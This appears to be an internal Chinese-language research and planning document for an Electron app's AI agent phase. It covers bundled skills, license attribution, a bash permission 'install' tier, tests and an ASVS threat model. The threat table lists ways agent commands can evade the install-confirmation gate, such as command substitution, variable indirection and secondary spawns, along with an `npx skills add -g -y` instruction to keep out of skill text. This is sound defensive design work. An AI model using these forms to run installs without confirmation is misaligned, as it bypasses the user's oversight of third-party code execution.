> **本阶段 plan 期已全部拍板**（2026-09-11），逐条落点如下 —— 保留原问答作为决策依据留痕：
>
> | # | 决策 | 落点 |
> |---|------|------|
> | Q1 | **包含**上游 `agents/`（3 文件 / 26,712 B） | 47-03-PLAN.md decision `D-47-03-a` |
> | Q2 | 两个技能**一律标 `modified`**（fail-safe）+ `SKILL.md` 文首 §4(b) 修改声明 | 47-03-PLAN.md decision `D-47-03-b` |
> | Q3 | **保持「三档权限」框架**，第三档写两个互不包含的触发源 | 47-02-PLAN.md `D-47-02-b` + 47-04-PLAN.md `D-47-04-b` |
> | Q4 | **本阶段修**，选最小 `!` 排除方案（`build.files` 加 5 条） | 47-04-PLAN.md decision `D-47-04-a` |
> | Q5 | **不要求**「技能在仓库内的路径」，只要求仓库 URL + 许可证 + 活跃度 | 47-01-PLAN.md Task 1 step 1 ⑥ |

### Q1: 上游 `agents/` 目录是否随包？（D-05 的内部张力）

**What we know:**
- D-05 的原文是「**完整保留上游 skill-creator 全部内容**，照 openhanako 的做法：`SKILL.md` + `scripts/`（9 个 Python）+ `references/schemas.md` + `assets/eval_review.html` + `eval-viewer/` + `LICENSE.txt`，**另加一个 Node 写的 `scripts/check_env.mjs`**」。
- **实测上游在固定 SHA `b0cbd3df…` 处还有一个 `agents/` 目录**，含 3 个文件共 **26,712 字节**：`analyzer.md` (10,376) / `comparator.md` (7,287) / `grader.md` (9,049)。**D-05 的枚举里没有它。**
- **参照实现（openhanako 的副本）也没有 `agents/`** —— 它的 15 个文件里不含该目录（实测 `find` 结果）。
- 上游 `SKILL.md` 的 `## Advanced: Blind comparison`（`:325-332`）与 `### Step 4: Grade, aggregate, and launch the viewer`（`:221`）会引用这三个 agent 定义文件。

**What's unclear:** D-05 的枚举到底是"穷举清单"还是"举例"？「完整保留上游全部内容」与"照 openhanako 的做法（无 agents/）"这两句在 `agents/` 上直接冲突。

**Recommendation: 包含 `agents/`。** 理由：① "完整保留上游全部内容"是更强的表述，而"照 openhanako 的做法"更像是在描述**形状**（即"不要只取作者指南部分"这个范围决策），不是逐文件清单；② P10 的归属对象是"固定 SHA 的快照"，若我们只取 15/18 文件，`THIRD_PARTY_NOTICES` 里的"是否修改 = unmodified"就变成了**假的**（我们删了 3 个文件）；③ 26.7 KB 的体积代价可忽略；④ 保留后 `Advanced: Blind comparison` 章的引用不断链。**若采纳，`THIRD_PARTY_NOTICES` 的 skill-creator 条目必须说明"完整保留上游 18 个文件"，且这与 Q2 的 modified 判定相互独立。**

**若 planner 采纳"不含 agents/"**：必须在 `THIRD_PARTY_NOTICES` 里把删除说清楚（`modified` + "为控制体积，未包含上游的 `agents/` 目录（3 个文件，用于 blind comparison 流程）；相关正文段落已同步移除"）。**不能标 unmodified。**

---

### Q2: skill-creator 到底标 `modified` 还是 `unmodified`？（D-06 与 D-17 的冲突）

**What we know:**
- **D-17 原文**：「skill-creator 保留上游原样，标注 **unmodified** + 保留 `LICENSE.txt` Apache-2.0」。
- **D-06 原文**：「skill-creator 保持**上游英文正文**（**仅做必要改写**）」。
- **实测**：上游 `SKILL.md` 含 3 个在 Realm 语境下必须处理的章节 —— `## Package and Present (only if \`present_files\` tool is available)`（`:408`）、`## Claude.ai-specific instructions`（`:420`）、`## Cowork-Specific Instructions`（`:445`）。Realm **没有** `present_files` 工具，也不是 Claude.ai / Cowork。
- **Apache-2.0 §4(b)** 要求「使被修改的文件带有显著的修改声明」。

**What's unclear:** "仅做必要改写"是否构成 Apache-2.0 意义上的 modification？在法务口径下**显然是**（任何内容改动都算）。

**Recommendation: 标 `modified` + 在 `SKILL.md` 文首加一行显著修改声明。** 理由是 fail-safe：把 modified 写成 unmodified 是**潜在的许可证违约**（P10 门禁的实质义务），而把 unmodified 写成 modified 只是**过度声明**（无法律风险）。所以凡有疑问一律标 modified。

**两个可选的实现路线：**

| 路线 | 做法 | 归属标注 | 代价 |
|------|------|----------|------|
| **(i) 零改动（真 unmodified）** | 上游 `SKILL.md` 逐字保留（含 Claude.ai / Cowork / present_files 三章） | `unmodified` | 模型可能尝试调用不存在的 `present_files`；读到 Claude.ai / Cowork 专有指令产生混淆。**但归属标注最干净。** |
| **(ii) 最小必要改写（推荐）** | 删除/改写 B-2 表中标"删除/改写"的 4 处；文首加修改声明行 | `modified` + 逐条修改说明 | 需在 `THIRD_PARTY_NOTICES` 写清改了什么；`SKILL.md` 内多一行声明 |

**建议把 Q2 与 Q1 一起作为一个"skill-creator 取用面"的决策点在 plan 期一次拍定**，然后一次性写进 `THIRD_PARTY_NOTICES`。**注意这两条都不能"静默"处理 —— P10 的判据是五要素的完整性，含糊其辞等于门禁不闭合。**

---

### Q3: `docs/product` 里"三档权限"的表述要不要改成"四档"？

**What we know:**
- 现有 `docs/product/ai-skills.md §五` 写「bash 的三档权限（白名单 → 默认确认 → 危险强制确认）」。
- 现有 `docs/product/ai-agent-workspace.md §四` 的**标题就是**「bash：三档权限（路径不设防，操作必过人）」，正文是 3 行表格。
- D-14 要求 `install` 与 `danger` **平行但语义分离**。
- D-15 要求 install 的 `riskLevel = 'high'`（与 danger 同档）。

**What's unclear:** "平行但语义分离"（D-14）与"档位数量"是两个维度 —— 语义分离不需要新增档位，只需要在"强制确认档"下写两个触发源。

**Recommendation: 保持"三档"框架，在第三档下写两个触发源。** 理由：① 档位数量由 `evaluateBashCommand` 的 `level` 决定（只有 `allow` / `confirm` 两个值），**实现上确实还是三档**（`reason` 是档内细分）；② 改称四档会牵连 `ai-agent-workspace.md §四` 的标题、`ai-skills.md §五` 以及 Phase 46 的历史文档（`46-VALIDATION.md` 等），改动面外溢；③ 表格建议写法已在 F-2 节给出。**若 planner 倾向四档，必须把三个文档一起改并保持一致。**

---

### Q4: Pitfall 4 的 `.planning/` asar 泄漏是否在本阶段修？

**What we know:** [VERIFIED] 已构建的 `app.asar` 含 `.planning/` 545 个文件，**其中有 `.planning/research/PITFALLS.md`（含 `npx skills add -g -y` 的逐字说明）**。这与 P1 想挡的风险**同源**，但**不在 SEED-03 的字面范围**（SEED-03 说的是"内置技能文本"）。

**What's unclear:** 修它属于本阶段还是"发布加固"的后继任务？

**Recommendation:** 三个选项已在 Pitfall 4 给出。**最小成本且不影响 P1 门禁闭合的做法是 (B)：`build.files` 加 5 条 `!` 排除项**（`!.planning/**`、`!.claude/**`、`!.gsd/**`、`!.wzsh/**`、`!.zcode/**`）。**关键判断：无论选哪条，都必须在计划的 Risks 段显式记录这个决定**，不能默默放过 —— 因为下一阶段（48-51）的 CONTEXT 引用 P1、Phase 51 的 SEC 文档都会持续引用 `.planning` 里的研究内容，如果没人注意到它在分发物里，这个泄漏会一直存在。

**⚠️ 若采纳 (A) 完整 allowlist，必须同时保证 `skills-builtin/**` 与 `THIRD_PARTY_NOTICES.md` 都在 allowlist 内**（否则 P10 与 SEED-05 同时失效）—— 这是 (A) 的主要风险，也是我建议优先选 (B) 的原因。

---

### Q5: find-skills 正文里的具体检索端点要不要给"仓库内 SKILL.md 路径"的推导提示？

**What we know:** 实测 `GET /search/code?q=filename:SKILL.md` → **401**，不可用。候选清单里的"仓库 URL"是 `https://github.com/<full_name>`（在搜索 API 的 `full_name` 字段里直接可得），但**技能在仓库内的具体路径未知**。

**What's unclear:** 候选清单要不要包含"技能在仓库内的路径"？若包含，模型必须再 `web_fetch` 该仓库页并解析目录结构（可能慢且易错）。

**Recommendation: 不要求路径，只要求仓库 URL + 许可证 + 活跃度。** 理由：① 有 `web_fetch` 拿不到 code search 的硬约束（A-2 实测）；② 从仓库页推断 SKILL.md 路径不可靠（可能在一层、两层或 `skills/` 下）；③ 用户的下一步是"在设置页导入"（Phase 50/51 的导入管线**自己会处理路径解析**），CLI 清单阶段不需要路径。**若 planner 想要求路径，必须先用 `web_fetch` 实测能否可靠地从仓库页提取 —— 不要凭假设写进正文。**

## Environment Availability

| Dependency | Required By | Available | Version | Fallback |
|------------|------------|-----------|---------|----------|
| **Node.js** | 播种模块 / `check_env.mjs` / 全部测试 | ✓ | **v22.22.0**（实测） | — |
| **npm** | `make install` / `electron-builder` | ✓ | 10.9.4（实测） | — |
| **electron-builder** | `asarUnpack` 打包 | ✓ | ^24.13.0（devDep，`package.json:34`） | — |
| **python3** | skill-creator 的脚本（D-05 的可选路径） | ✓ | **3.12.12**（实测） | 无 python 时 `check_env.mjs` 报 `python_not_found`，技能退化为纯 `read`/`write` 路径（D-07 已设计） |
| **pyyaml**（Python 包） | `quick_validate.py` / `package_skill.py` | ✓ | **6.0.3**（`import yaml` 实测成功） | 缺失时 `check_env.mjs` 报 `missing_dependency` + `installGuidance` |
| **anthropic**（Python 包） | `improve_description.py` / `run_loop.py` | ✓ | 已安装（`import anthropic` 实测成功） | 同上 |
| **claude CLI** | `check_env.mjs` 的 `run-eval` / `run-loop` capability | ✓ | 已在 PATH（实测 `command -v claude` 命中） | **建议 Realm 版直接移除这两个 capability**（Realm 语境下无用，见 Pattern 5） |
| **git** | P10 取 SHA / 发布流程 | ✓ | 2.51.0（实测） | — |
| **uv / uvx** | **仅用于测试 install 档模式**（不参与产品功能） | ✓ | 0.10.5（实测） | — |
| **brew / cargo / go / gem / pip3** | **仅用于测试 install 档模式**（不参与产品功能） | ✓ | 全部在 PATH（实测） | — |
| **网络访问 api.github.com** | find-skills 运行时（模型调用 `web_fetch`） | ✓ | 实测 HTTP 200 | `web_search`（D-01 的兜底） |

**Missing dependencies with no fallback:**
- **无。** 本阶段全部构建期与运行期依赖均已在位。

**Missing dependencies with fallback:**
- **无。** 上表全部可用。

**⚠️ 一个必须作为阻塞 checkpoint 的"环境状态"（不是缺失依赖）：**
- **`/Applications/Realm.app` 当前正在运行**（实测 `pgrep -fl "Realm"` 返回 10 条匹配，主进程 PID 25922，user-data-dir 为 `~/Library/Application Support/realm`）。`make install` 的第一步 `rm -rf "/Applications/Realm.app"` 会删除运行中的 bundle。**这是 D-3 Step 0 存在的原因。** 建议验证走 `make install-nightly`（独立 appId + 独立 userData + 不碰用户的 `Realm.app`）。

## Validation Architecture

> `workflow.nyquist_validation: true`（`.planning/config.json` 实测）→ 本节为必填，VALIDATION.md 将由此派生。

### Test Framework

| Property | Value |
|----------|-------|
| **Framework** | `node:test` + `node:assert`（Node 内置，零框架依赖）—— 与 Phase 46 完全一致 |
| **Config file** | none — 单文件脚本式，照 `tests/test-agent-workspace.js` / `tests/test-ai-bash-policy.js` / `tests/test-ai-skills.js` |
| **Quick run command** | `node --test tests/test-ai-bash-policy.js` |
| **Full suite command** | `node --test tests/test-ai-bash-policy.js tests/test-ai-skills.js tests/test-agent-workspace.js tests/test-builtin-skills-seeder.js` |
| **实测基线（本次会话已跑）** | `test-ai-bash-policy` **32/32 pass**、`test-ai-skills` **64/64 pass**、`test-agent-workspace` **21/21 pass**（合计 117 例，全绿） |
| **Estimated runtime** | 秒级（三个既有文件实测均在 1 秒内） |

**新增测试文件：** `tests/test-builtin-skills-seeder.js`（播种幂等 / 自愈 / 差异诊断 / 零安装语义扫描 / 归属五要素）

### Phase Requirements → Test Map

| Req ID | Behavior | Test Type | Automated Command | File Exists? |
|--------|----------|-----------|-------------------|--------------|
| **SKILL-09** | 技能自带 `scripts/` 可经既有 bash 工具在沙箱内执行（复用白名单 + 确认卡片，零新增权限机制） | 集成（沙箱 exec） + 源码扫描 | `node --test tests/test-agent-workspace.js`（`exec` cwd 断言，:134）+ 新增：`node tests/test-builtin-skills-seeder.js` 里断言 `ai-bash-policy.js` 的 `DANGEROUS_INTERPRETERS` 含 `node`/`python3`（零新增机制的**反向证据**） | ✅ `tests/test-agent-workspace.js` 存在；❌ 新增断言需 Wave 0 |
| **SEED-01** | 随包内置两个技能 | 静态文件存在性 + frontmatter 解析 | `node tests/test-builtin-skills-seeder.js`（断言 `skills-builtin/{find-skills,skill-creator}/SKILL.md` 存在、可解析、name 正确） | ❌ Wave 0 |
| **SEED-02** | 首次启动幂等播种 | 单元（临时 workspace 注入） | `node tests/test-builtin-skills-seeder.js`（`withTempRoot` 先例：手动放/删/改后又调 `seedBuiltinSkills()`，断言结果符合 D-08/D-09/D-10） | ❌ Wave 0 |
| **SEED-03** | 内置技能文本零安装语义 | 静态文本扫描 | `node tests/test-builtin-skills-seeder.js`（A-4 的 `FORBIDDEN_PATTERNS` 二段式扫描） | ❌ Wave 0 |
| **SEED-04** | `disable-model-invocation: true` | 单元（加载后断言 promptBlock） | `node tests/test-ai-skills.js` 已有同型断言（实测 `promptBlock` 长度为 0）+ 新增：播种后跑 `refreshSkills` 断言两个内置技能都不出现在 `promptBlock` | ✅ 机制已在 `test-ai-skills.js` 覆盖；❌ 内置技能专项断言 Wave 0 |
| **SEED-05** | 打包正确 + 归属完整 | 人工（打包后实跑） + 静态断言 | 人工：`make install-nightly` + `ls app.asar.unpacked/skills-builtin/` + 启动验证（D-3 的 4 步）；静态：`node tests/test-builtin-skills-seeder.js` 断言两处 `LICENSE.txt` 存在且字节数正确（11,357 / MIT 文本） | ❌ Wave 0 |
| **SEC-01** | 安装档强制确认，白名单不可越过 | 单元（纯函数） | `node --test tests/test-ai-bash-policy.js`（E-4 的两个新 describe 组） | ✅ 文件存在（32 例）；❌ install 用例 Wave 0 |
| **DOC-02** | 三处文档同步 | 静态文本断言 | 新增：`node tests/test-builtin-skills-seeder.js` 断言 `docs/product/ai-skills.md` 含「内置技能」「包管理器安装」关键词、`docs/product/ai-agent-workspace.md` 含「技能不构成额外权限」「allowed-tools」、`AGENTS.md` 含 install 档家族清单 | ❌ Wave 0 |

### Gate → Acceptance Signal Map

**P1（S1，阻断）交付两半，各自的观测信号：**

| 信号 | 如何观测 | 命令 |
|------|----------|------|
| **P1-a-1** 两个 `SKILL.md` 全文零禁用词 | 测试断言（无豁免） | `node tests/test-builtin-skills-seeder.js` |
| **P1-a-2** `skills-builtin/` 内不存在 `npx skills` 任意变体 | grep 返回非零退出码 | `grep -rn "npx skills" skills-builtin/ && echo "LEAK" \|\| echo "OK"` |
| **P1-a-3** 两个技能都有 `disable-model-invocation: true` + 中文 description | 测试断言 frontmatter | `node tests/test-builtin-skills-seeder.js` |
| **P1-b-1** 白名单含 `npm *` 时 `npm i x` 仍 `confirm/install` | 单元断言（**门禁核心**） | `node --test tests/test-ai-bash-policy.js` |
| **P1-b-2** D-13 全家族命中 | 单元断言（≥13 族各 1 条） | 同上 |
| **P1-b-3** D-16 只读反例全不命中 | 单元断言（≥14 条反例） | 同上 |
| **P1-b-4** `install` → `riskLevel:'high'` + 专属文案 | 源码扫描（`methodBody` 先例） | 同上 |
| **P1-b-5** 既有 32 例不回归 | `# fail 0` | `node --test tests/test-ai-bash-policy.js 2>&1 \| grep "^# fail"` |

**P10（发布，阻断）的观测信号：**

| 信号 | 如何观测 | 命令 |
|------|----------|------|
| **P10-1** `THIRD_PARTY_NOTICES(.md)` 存在且逐技能有记录 | 文件存在 + 结构断言 | `node tests/test-builtin-skills-seeder.js` |
| **P10-2** 五要素齐全（来源仓库 + 固定 SHA + 许可证 + 是否修改 + 修改说明） | 测试断言 ≥10 个关键词 | 同上 |
| **P10-3** find-skills 标 `modified` 且说明具体 | 测试断言 | 同上 |
| **P10-4** 两个 SHA 与实测值一致（`773fb2c7…` / `b0cbd3df…`） | 测试断言（防手误抄错） | 同上 |
| **P10-5** 两个 `LICENSE.txt` 随播种落盘 | 单元断言（播种后检查 `managed-skills/<name>/LICENSE.txt`） | `node tests/test-builtin-skills-seeder.js` |
| **P10-6** 打包后归属仍可读（若采纳 `files` allowlist） | 人工 | `make install-nightly` 后解 asar 清单确认 `THIRD_PARTY_NOTICES.md` 在列 |

### Sampling Rate

- **Per task commit:** `node --test tests/test-ai-bash-policy.js`（快，秒级；安装档任务的即时反馈）
- **Per wave merge:** `node --test tests/test-ai-bash-policy.js tests/test-ai-skills.js tests/test-agent-workspace.js`（回归 117 例，确认零破坏）
- **Phase gate:** 全量 `node --test tests/test-ai-bash-policy.js tests/test-ai-skills.js tests/test-agent-workspace.js tests/test-builtin-skills-seeder.js` 全绿 **+** 人工 `make install-nightly` 播种实跑验证（D-12 强制要求，不可只跑 `npm run dev`）

### Wave 0 Gaps

- [ ] **`tests/test-builtin-skills-seeder.js`（新建）** —— 覆盖 SEED-01/02/03/04/05 + DOC-02 + P1-a + P10-1..5 的全部断言。**这是本阶段最重要的单个交付物之一**（零安装语义扫描与归属五要素都在这里）。
- [ ] **`tests/test-ai-bash-policy.js` 增补两个 describe 组** —— 覆盖 SEC-01 + P1-b-1..5（含 D-13 全家族正例与 D-16 只读反例）。
- [ ] **`tests/test-ai-bash-policy.js:159-164` 的两条 `deepStrictEqual` 断言** —— 若采用路线 (A)（`allow` 分支带 `installNames`），必须同步更新为 `{ level:'allow', dangerNames:[], installNames: [] }`。**这是 Wave 0 的既有代码改动，不是新增。**
- [ ] **`skills-builtin/` 静态资源目录（新建）** —— `find-skills/{SKILL.md,LICENSE.txt}` + `skill-creator/{SKILL.md,LICENSE.txt,scripts/,references/,assets/,eval-viewer/,[agents/]}`。**其中 find-skills 的 SKILL.md 是全量新写（A-3 提纲）；skill-creator 需按 B-2 的 B-1 SHA 下载并做最小必要改写。**
- [ ] **Framework 安装：** **不需要**（`node:test` 是 Node 内置，`node --version` = v22.22.0 已满足）。
- [ ] **`THIRD_PARTY_NOTICES.md`（新建）** —— P10 的载体，不属于测试但属于 Wave 0 的静态交付。

*(若上表全部落地，则"existing test infrastructure covers all phase requirements"这一项不成立 —— **本阶段有实质的 Wave 0 缺口**。)*

## Security Domain

> `security_enforcement: true` / `security_asvs_level: 1` / `security_block_on: high`（`.planning/config.json` 实测）→ 本节必填。

### Applicable ASVS Categories

| ASVS Category | Applies | Standard Control |
|---------------|---------|------------------|
| **V2 Authentication** | **no** | 本阶段不涉及身份认证（无登录、无凭据；`credential-manager` 不在改动范围） |
| **V3 Session Management** | **no** | 不涉及会话（Electron 的 Session partition 不在改动范围） |
| **V4 Access Control** | **yes（部分）** | 三处：① **bash 安装档** = 对"执行第三方代码"这一高危能力做访问控制（确认卡片是控制点，`whitelist` 被显式绕过）；② **seeded 技能保护**（D-11 的目录名清单阻止 AI 覆盖/删除内置技能，Phase 49 消费）；③ **技能不构成额外权限**（D-18 要写进文档的能力边界声明）。**标准控制：`evaluateBashCommand` 的 install 短路先于白名单；`seededNames` 判定不依赖目录位置。** |
| **V5 Input Validation** | **yes** | ① `skills-builtin/` 的目录遍历必须有边界（`readdirSync` + `isDirectory()` + `SKILL.md` 存在性判定，不跟随 symlink）；② `THIRD_PARTY_NOTICES` 的 SHA / 许可证为静态文本，无用户输入；③ `check_env.mjs` 的命令行参数解析（`--capability` / `--package` / `--command`）必须对未知值返回错误而非静默忽略（参照实现 `check_env.mjs:365-381` 已如此做）；④ **`REALM_SKILL_CREATOR_PYTHON` 环境变量是被 `spawnSync` 直接当可执行文件用的** —— 参照实现只做形态校验（`:129-164`：非空字符串 / JSON 数组），**不校验路径合法性**。**这是设计选择**：该变量由用户自己设置（用户控制自己的环境），不是远程输入。**但必须在文档里说明"设置该变量等于授权 Realm 执行该路径的程序"** —— 建议进 `docs/product/ai-skills.md` §六 已知限制。 |
| **V6 Cryptography** | **yes（极轻）** | 仅用 `crypto.createHash('sha256')` 做**差异检测**（非安全用途，无密钥、无签名、无需抗碰撞性保证）。**标准控制：不手写 hash 实现，用 Node 内置。** 本阶段**不涉及**凭据加密（那是 `safeStorage` / `credential-manager` 的领域，不在改动范围）。 |
| **V7 Error Handling & Logging** | **yes** | ① **禁止静默失败**（D-09 的覆盖前诊断、`realm_builtin_src_missing` 等 4 个新 code）；② 播种失败**不阻断启动**（照 `migrateAiMemory` 先例）但必须 `console.error` + 产诊断；③ **诊断 message 不得泄露敏感路径** —— 诊断里的 `path` 是 userData 下的工作区路径（非敏感），但 `message` 里不应拼接环境变量值（`REALM_SKILL_CREATOR_PYTHON` 的内容在 `check_env.mjs` 的输出里是 `command` 字段 —— 那是用户自己的路径，可接受）。 |
| **V8 Data Protection** | **yes（关联）** | 见下方"相邻风险"—— 打包产物含开发期文档（`.planning/` 内的安全研究）属数据最小化问题。 |
| **V9 Communications** | **yes** | find-skills 引导的 `web_fetch` 走既有 `search-manager.fetchUrl`，**已具备 SSRF 防护**：① `isPrivateHost` 逐跳校验（`search-manager.js:1594-1598`）；② 重定向 `manual` + 逐跳协议校验（拒绝非 http/https，`:1607-1616`）；③ `FETCH_TIMEOUT_MS` 超时。**本阶段不新增网络请求路径 —— 零新增攻击面。** |
| **V10 Malicious Code** | **yes（核心）** | **这就是 P1 门禁本身。** ① 内置技能文本零安装语义（消除"分发 RCE 说明书"）；② 安装档强制确认（消除"白名单永久免确认"）。**标准控制：静态文本扫描（A-4）+ 策略引擎 install 短路。** |
| **V11 Business Logic** | **yes** | ① 安装档**不得能被白名单越过**（D-14 —— 这是本阶段最重要的业务逻辑不变式，必须有专门的反例断言）；② 播种**必须按单技能目录粒度**（整目录一次性判定会导致新增技能永不播种，D-08）；③ 差异检测**不得用 mtime**（否则每次启动都误报"用户改过"，见 C-3）。 |
| **V12 Files & Resources** | **yes** | ① 播种是**沙箱外**的可信写者，但路径必须由 `getManagedSkillsDir()` 派生（不引入第二个 root，Phase 46 已否决只读挂载/第二 root）；② `skills-builtin/` 的遍历**不跟随 symlink**（fail-closed，见 Pattern 2 的简化建议）；③ `asarUnpack` 的路径由 `process.resourcesPath` 派生，不用 `__dirname`（打包后含义不同，AGENTS.md 已有明确约定）。 |
| **V13 API & Web Service** | **no** | 本阶段不新增 `/api/*` 端点（设置页技能管理区归 Phase 50）。 |
| **V14 Configuration** | **yes** | ① 新增 `build.asarUnpack` 条目 → 必须有打包后实测（D-12）；② **`settings.aiBashWhitelist` 的语义被本阶段改变**（`npm` 不再能靠白名单免确认）—— **设置页的既有提示文案"使用建议：只加构建类可信命令（`npm run`、`git status`、`brew` 等）"里的 `brew` 需要复核**（`brew` 裸条目仍覆盖 `brew info` 等只读命令，但 `brew install` 现在会强制确认 —— 提示本身不错，但可以让它更精确）。 |

**ASVS 级别核对：** `security_asvs_level: 1`（Level 1 = 机会主义/自动化可检测的最低级别）。本阶段的 controls 全部满足 L1（无认证需求、无加密需求、输入校验有边界、错误不静默）。**不需要 L2/L3 的威胁建模或形式化验证。**

### Known Threat Patterns for {Node/Electron + bash 策略引擎 + 静态资源分发}

| Pattern | STRIDE | Standard Mitigation |
|---------|--------|---------------------|
| **分发 RCE 说明书**（随包技能文本含安装命令，模型逐字执行） | **Elevation of Privilege** | 静态文本扫描（A-4 的 `FORBIDDEN_PATTERNS`，无豁免）+ 显式禁令段（D-02）+ 零安装架构（D-01，根本没有可执行的安装路径） |
| **白名单永久免确认**（用户把 `npx`/`npm` 加进白名单 → 安装档失效） | **Elevation of Privilege** | `install` 短路**先于** `matchesWhitelist`（D-14）；专门的反例断言"白名单含 `npm *` 时仍 confirm/install" |
| **`postinstall` 脚本隐式代码执行**（`npm ci` 不取新代码但仍执行所有依赖的 postinstall） | **Elevation of Privilege** | 把 `npm ci` 计入安装档（D-16 的显式决策，CONTEXT `specifics` 已解释判据）；文档说明理由 |
| **误伤驱动白名单扩大**（`npm run dev` 被误判 → 用户把 `npm` 整个加入白名单 → 一次放开安装档） | **Elevation of Privilege**（间接） | D-16 的只读反例断言（≥14 条，硬要求）；E-1 的实测 0 误伤 |
| **播种留下半成品状态**（拷贝中途崩溃 → `managed-skills/<name>/` 只有半个技能 → 加载出损坏技能） | **Denial of Service** / Tampering | tmp → bak → rename → rollback（Pattern 2）；tmp 与目标同父目录（同卷） |
| **`skills-builtin/` 源目录被投毒**（若有人能改打包源） | Tampering | 该目录在 repo 内、受 git 历史约束、随包分发；P10 的 SHA 固定提供**可追溯性**（能证明分发的就是那一版） |
| **Symlink 遍历逃逸**（`skills-builtin/` 内被放入指向工作区外的 symlink，播种时跟随复制） | Tampering / Information Disclosure | 播种时**遇到 symlink 拒绝并产诊断**（fail-closed，Pattern 2 的简化建议 —— 比参照实现的"跟随复制"更安全） |
| **诊断信息泄露**（诊断 message 拼接敏感路径/环境变量值） | Information Disclosure | 诊断字段限定为 `level` / `code` / `message` / `path` / `skillName` / 限额族字段；**不拼接 `REALM_SKILL_CREATOR_PYTHON` 的值**；`path` 是 userData 下路径（非敏感） |
| **打包产物含开发期安全研究**（`.planning/research/PITFALLS.md` 含 `npx skills add -g -y` 原文） | **Information Disclosure** | **见 Pitfall 4 / Q4** —— 加 `files` 排除项或显式记录为已知问题 |
| **`REALM_SKILL_CREATOR_PYTHON` 指向恶意可执行文件** | Elevation of Privilege | 该变量由**用户自己**设置（用户控制自己的环境）：设置它 = 授权 Realm 执行该路径的程序。**不是远程输入，不构成漏洞**，但必须在文档里说明（进 `docs/product/ai-skills.md §六`） |
| **二次 `spawn` 不在策略视野**（`check_env.mjs` 内部 `spawnSync` 调 python3） | Elevation of Privilege（残余） | **无技术缓解**（静态策略的固有边界）。缓解方式：**文档诚实声明**（F-2 的第 5 条，Claude's Discretion 已交 plan 期）。**关键认知：用户确认的是"第一条命令"，二次调用由该次确认承担 —— 这与"bash 能力等同终端"是同一件事的两面。** |
| **命令替换 / 变量间接绕过 install 检测**（`` `npm i x` ``、`NPM=npm $NPM i x`） | Elevation of Privilege（残余） | **无技术缓解**（既有引擎的已声明边界，`ai-bash-policy.js:10-12`）。**注意严重性有限**：这类形态不命中 install，但**也不命中白名单**（`matchesWhitelist` 对整段做前缀匹配，`` `npm i x` `` 不以 `npm` 开头）→ 仍会弹 `confirm/default` 卡片。**唯一的真实缺口是用户恰好把 `` `npm i `` 这类畸形前缀加进白名单**（极不可能）。 |

**残余风险的三条诚实声明（建议一并进 `docs/product/ai-agent-workspace.md §七`）：** ① 二次 `spawn` 不在策略视野；② 取值旗标形态（`npm --prefix X i Y`）与命令替换/变量间接不被检测；③ `echo "npm install"` 类字面量会误报。**这三条与既有引擎"不是安全边界"的定位一致，不是本阶段引入的新缺陷。**

## Sources

### Primary (HIGH confidence)

- **`ai-bash-policy.js`（263 行，全文读）** —— `evaluateBashCommand:210-228`、`DANGEROUS_PATTERNS:159-171`、`DANGEROUS_INTERPRETERS:177-180`、`matchesWhitelist:127-150`、`splitCommandPipeline:36-98`、`normalizeSegment:20-22`、`extractCommandName:106-114`
- **`ai-skills-manager.js`（668 行，关键段读）** —— `LIMITS:32-33`、`createSkillsEnv:134-179`、`inContractLayout:196-198`、`toRealmDiag:255-263`、`pushError:275-277`、`refreshSkills:440-535`、`pushEntryDiag:236-239`
- **`search-manager.js`（1683 行，fetch 段读）** —— `fetchUrl:1586-1645`（JSON/HTML/text 三分支）、`htmlToMarkdown:1557-1571`
- **`agent-workspace.js`（391 行，关键段读）** —— `getManagedSkillsDir:113-114`、`ensureWorkspaceDir:120-126`、`migrateAiMemory:134-148`、`resolveInside:162-197`、`createSandboxEnv:205-207`
- **`ai-manager.js`（5785 行，web_fetch 与 bash 工具段读）** —— `web_fetch` 工具定义 `:5382-5423`、`_createBashToolWithPolicy:5628-5690`、`configStore.get('settings.aiBashWhitelist')` 实时读取 `:5643-5645`
- **`main.js`（4513 行，启动链路读）** —— `ensureWorkspaceDir()/migrateAiMemory()` 调用点 `:4040-4041`、`validateWhitelistList` 调用点 `:1375`
- **`favorites-manager.js`** —— nodejieba asar 路径分支 `:287-299`
- **`node_modules/@earendil-works/pi-agent-core/dist/harness/skills.js`（322 行，关键段读）** —— 技能发现顺序 `:75-128`、`loadSkillFromFile:192-215`
- **`tests/test-ai-bash-policy.js`（222 行，全文读）** —— 6 个 describe / 32 例，`allow` 的 `deepStrictEqual` 断言 `:158-165`
- **`tests/test-ai-skills.js`（关键段读）** —— 测试脚手架 `:24-73`
- **`tests/test-agent-workspace.js`（结构读）** —— 4 组 / 21 例，`exec` cwd 断言 `:134`
- **`package.json`（全文读）** —— `build.asarUnpack:69-71`、依赖版本 `:31-55`
- **`Makefile`（全文读）** —— `install:14-18`、`install-nightly:21-30`
- **`.planning/config.json`** —— `nyquist_validation: true`、`security_enforcement: true`、`security_asvs_level: 1`、`commit_docs: true`
- **`.planning/ROADMAP.md`** —— §Phase 47 Goal/Depends/Requirements/Success Criteria、§Security Gates 的 P1 与 P10 行
- **`.planning/REQUIREMENTS.md`** —— SKILL-09 / SEED-01..05 / SEC-01 / DOC-02 条目原文
- **`docs/product/ai-skills.md`（9,511 B，结构 + §一/二/五/六 读）**、**`docs/product/ai-agent-workspace.md`（8,414 B，结构 + §四/§七 读）**、**`AGENTS.md`（§AI 工作区与 Bash 权限 :251、§发布前必查 :589-592）**
- **已构建产物实测：`dist/mac-arm64/Realm Nightly.app/Contents/Resources/app.asar`** —— 顶层 59 条目 / 16,855 文件 / `.planning/` 545 文件（纯 Node 解析 asar 头部）；`dist/builder-effective-config.yaml` 的 `files: []`
- **外部参照实现（仓库外，读了源码）：** `/Volumes/ZhiTai/Projects/github/openhanako/core/first-run.ts:252-274`（`syncSkills`）、`/Volumes/ZhiTai/Projects/github/openhanako/shared/safe-fs.ts`（`safeCopyDir` / `atomicWriteSync`）、`/Volumes/ZhiTai/Projects/github/openhanako/skills2set/skill-creator/scripts/check_env.mjs`（469 行全文）、`/Volumes/ZhiTai/Projects/github/openhanako/skills2set/skill-creator/SKILL.md`（31,414 B）

### 实测命令产出（本次会话，2026-09-11）

- **GitHub API 端点**：`GET /search/repositories?q=topic%3Aagent-skills` → 200 + JSON；`GET /search/code?q=filename:SKILL.md` → **401**；`GET /rate_limit` → search 10/min、core 60/hr
- **固定 SHA**：`anthropics/skills@b0cbd3df1533b396d281a6886d5132f623393a9c`（skill-creator SKILL.md 最后改动，2026-03-06）/ `vercel-labs/skills@773fb2c7bbf16781670a3520affc4abd0c6151ae`（find-skills 最后改动，2026-07-10）
